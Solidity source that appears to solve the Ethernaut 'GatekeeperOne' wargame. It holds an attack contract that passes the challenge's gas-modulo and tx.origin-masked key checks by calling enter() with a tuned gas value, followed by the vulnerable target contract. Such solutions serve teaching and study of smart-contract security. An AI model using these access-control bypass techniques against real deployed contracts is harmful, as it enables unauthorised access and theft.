// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperOne} from "../tasks/gatekeeperone.sol";

contract GateKeeperOneAttack {
    //     address public gatekeeper;
    //     bytes8 public key;

    //     constructor(address _gatekeeper) {
    //         gatekeeper = _gatekeeper;
    //     }

    //     function getKey() internal returns (bytes8) {
    //         key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
    //         return key;
    //     }

    //     function letMeIn(uint256 _gas) public {
    //         (bool success, ) = gatekeeper.call{gas: _gas}(
    //             abi.encodeWithSignature("enter(bytes8)", getKey())
    //             // abi.encodeWithSignature("enter(bytes8)", "0xffffffffffffffff")
    //         );
    //     }
    // }

    GatekeeperOne private victim;
    address private owner;

    constructor(GatekeeperOne _victim) public {
        victim = _victim;
        owner = msg.sender;
    }

    function exploit(bytes8 gateKey) external {
        victim.enter{gas: 401627}(gateKey);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}